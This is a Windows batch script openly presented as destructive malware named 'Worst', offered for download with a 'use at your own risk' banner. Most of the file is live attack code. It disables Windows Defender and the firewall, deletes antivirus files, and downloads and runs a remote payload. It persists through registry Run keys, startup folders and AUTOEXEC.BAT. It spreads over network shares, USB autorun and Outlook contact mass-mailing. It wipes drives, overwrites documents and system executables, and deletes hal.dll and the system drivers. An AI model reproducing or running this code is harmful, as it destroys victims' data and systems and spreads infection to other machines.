@echo off

::                   THIS
::                    IS 
::                   YOUR
::  █     █░ ▒█████   ██▀███    ██████ ▄▄▄█████▓
:: ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒▒██    ▒ ▓  ██▒ ▓▒
:: ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒░ ▓██▄   ▒ ▓██░ ▒░
:: ░█░ █ ░█ ▒██   ██░▒██▀▀█▄    ▒   ██▒░ ▓██▓ ░ 
:: ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██████▒▒  ▒██▒ ░ 
:: ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░  ▒ ░░   
::   ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒  ░ ░    ░    
::   ░   ░  ░ ░ ░ ▒    ░░   ░ ░  ░  ░    ░      
:: ░        ░ ░     ░           ░           
::                  Nightmare       
::
::
::
:: -------------|  Malware info  |-------------
:: |
:: | Harm Level - severe    or     8/10
:: | Creator - CPScript
:: | OS System - Windows
:: | Created - March, 6th 2023
:: | How to use - USB or executable
:: | File size - 14 kb
:: | Encrypted - NO
:: | Encryption - NO
:: | Warnings - NO
:: | Where to get - https://Github.com/CPScript/Worst
:: | Harmfull - YES
:: | Payloads - 2
:: | Finished on - March, 8th 2023
:: 
:: 
:: 
:: 
:: !!!! Use at your own risk !!!!
::============================================================================================================================
::
:: =============
:: |   Start   |
:: =============


color 6D

title Worst

:: Are you using a VM?

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
) else (
    goto Worst
    
:: Run me as admin LOSER

:admin

net session >nul 2>&1

if %errorLevel% == 0 (
    goto runner
) else (
    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
    start C:\Windows\Admin.vbs
    pause
    exit
)

:runner

:: NOTHING WILL STOP ME NOW!

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

:: New name... lets go!!!!

RENAME %0 Worst.exe

:: I need myself a new home now...

MOVE /e /y Worst.exe C:\Windows

:: Fuck off 

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MalDev101/Loveware/blob/master/Loveware/FinalPayload/FinalPayload.exe', 'Woops.exe')"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/MalDev101/Loveware/blob/master/Loveware/FinalPayload/FinalPayload.exe -OutFile Woops.exe"

:: No escape

XCOPY "%USERPROFILE%\Downloads\Woops.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Im going to kill you

XCOPY "Worst.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: I must DO MORE!!! Your internet connected computers are mine

@echo off > service.bat
SET "NomeProcesso=Worst.exe" >> service.bat
SET "NomeService=Worst" >> service.bat
echo sc create %NomeService% binpath=%0 >> service.bat
echo sc start %NomeService% >> service.bat

attrib +h +r +s service.bat
start service.bat

SET i=0

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0

:Internet
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto worm
goto Internet

:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
goto Infect

:: Contacts?!?!? lets see what they think

:worm

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Worst
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
set b=Worst
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Something cool!">>%SystemDrive%\mail.vbs
echo Mail.Body="Hey... I found this cool executable file... wanna see?">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"

goto run2

goto worm

:: OOOOOOOO... autoexec.bat?... MINE

:run2

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Worst
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=Worst
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini

:: MAN...
:: all of this work is making me hungry...
:: lemme find summ to eat :)

:: ~~Eats your Hard drives~~

del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q

:: MAN... dont make this experiance STOP

echo [autorun] > windows.inf
echo ;open=Worst.exe >> windows.inf
echo ShellExecute=Worst.exe >> windows.inf
echo UseAutoPlay=1 >> windows.inf

:: Copy windows.inf to usb

xcopy /e /y windows.inf D:\
xcopy /e /y windows.inf E:\
xcopy /e /y windows.inf F:\
xcopy /e /y windows.inf G:\
xcopy /e /y windows.inf H:\

:: Flash drives (USB sticks) lemme make them my home real quick

xcopy /e /y Worst.exe D:\
xcopy /e /y Worst.exe E:\
xcopy /e /y Worst.exe F:\
xcopy /e /y Worst.exe G:\
xcopy /e /y Worst.exe H:\

:: MORE FOOD!!!!!!!!!!!!!!!!!!!!!!!!

assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"

assoc .doc=batfile
DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"

assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"

assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"

assoc .xml=batfile
DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"

assoc .mp3=batfile
DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"

assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"

assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"

:: Send message to other users

:haha
msg * "Worst Nighmare"
net send * "Im your Worst Nightmare"
goto run3
goto haha

:run3

:: More fun lol


tskill pbrush
copy /y Worst.exe C:\Windows\pbrush.exe

tskill excel
copy /y Worst.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"

tskill mspaint
copy /y Worst.exe "%windir%\system32\mspaint.exe"

tskill WINWORD
copy /y Worst.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"

tskill calc
copy /y Worst.exe "%windir%\system32\calc.exe

tskill msaccess
copy /y Worst.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"

tskill iexplore
copy /y Worst.exe "C:\Program Files\Internet Explorer\iexplore.exe"

tskill safari
copy /y Worst.exe "C:\Program Files\Safari\Safari.exe"

:: Create new vbs file that speaks.

echo do > speak.vbs
echo CreateObject(“SAPI.SpVoice”).Speak”HAHA” >> speak.vbs
echo loop >> speak.vbs

: Create the final payload "boo"

echo @echo off > boo.bat
echo color 40 >> boo.bat
echo title boo >> boo.bat

echo set z=%random% > Stop.bat
echo set z=%random% > Continue.bat

:: Boo is now unclosable

echo :checker >> boo.bat

echo goto boo >> boo.bat

echo if "%1" equ "Restarted" goto %1 >> boo.bat

echo :again >> boo.bat
echo echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL >> boo.bat
echo goto :again >> boo.bat

echo :Restarted >> boo.bat
echo goto checker >> boo.bat

echo :boo >> boo.bat

:: you can choose to stop or continue

echo echo I'v had my fun, but i don't know if i can continue... should i? (Only answer with Yes or No)>> boo.bat

echo set /p scary= >> boo.bat
echo if %love%==yes goto Stop this madness >> Stop.bat
echo if %love%==no goto Keep on going >> Continue.bat

:: answer - Stop

echo :scary>>boo.bat

echo echo ok... Im done...>>boo.bat

:: Clean

echo @echo off > clean.bat
echo echo Cleaning up >> boo.bat

echo :clean >> clean.bat
echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Woops.exe" >> clean.bat

echo cls >> boo.bat

echo echo Starting... you will be saved soon >> boo.bat

echo start /min clean.bat

echo timeout 10 >> boo.bat

echo cls >> boo.bat

echo echo Now it is safe to reboot your computer! >> boo.bat
echo echo Now leaving... goodbye. >> boo.bat

echo pause >> boo.bat

shutdown /s >> boo.bat
echo exit >> boo.bat


:: answer - Continue

echo CD Desktop >> Continue.bat
echo ren *.png Worst.Nightmare >> Continue.bat
echo ren *.jpg Worst.Nightmare >> Continue.bat
echo ren *.gif Worst.Nightmare >> Continue.bat
echo ren *.docx Worst.Nightmare >> Continue.bat
echo ren *.doc Worst.Nightmare >> Continue.bat
echo ren *.pdf Worst.Nightmare >> Continue.bat

:: Delete mouse

echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass" >> Continue.bat
echo reg delete %key% >> Continue.bat
echo reg add %key% /v Start /t REG_DWORD /d 4 >> Continue.bat

:: Overwrite regedit to have more fun

echo copy /y Worst.exe C:\Windows\regedit.exe >> Continue.bat

echo timeout 400 >> Continue.bat

:: Kill explorer

echo start "" invisi.vbs >> Continue.bat

:: Just killing you

echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Woops.exe >> Continue.bat
echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll" >> C.bat
echo @((( Echo Off > Nul ) & Break Off ) >> Continue.bat
echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> Continue.bat
echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul >> Continue.bat
echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*" >> Continue.bat
echo )>>Continue.bat
echo shutdown /s>>Continue.bat

echo CreateObject("Wscript.Shell").Run "C:\Windows\yes.vbs" & WScript.Arguments(0) & "C:\Windows\Stop.bat", 0, False>yes.vbs
echo CreateObject("Wscript.Shell").Run "C:\Windows\no.vbs" & WScript.Arguments(0) & "C:\Windows\Continue.bat", 0, False>no.vbs

:: Start the payload (boo)

start boo.bat

:: Put on some music

start /min https://www.youtube.com/watch?v=gMA1FUpuELo

:: Restart "boo" if someone closes it

:checker

if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
goto checker

:: THIS SOFTWARE IS PROTECTED BY A GNU PUBLIC LICENSE
:: DO NOT UPLOAD THIS SAMPLE ON VIRUS TOTAL TO PREVENT 
:: ANTI VIRUS DETECTION.
:: I AM NOT RESPONSIBLE FOR THE DAMAGE CAUSED BY 
:: THIS SOFTWARE!
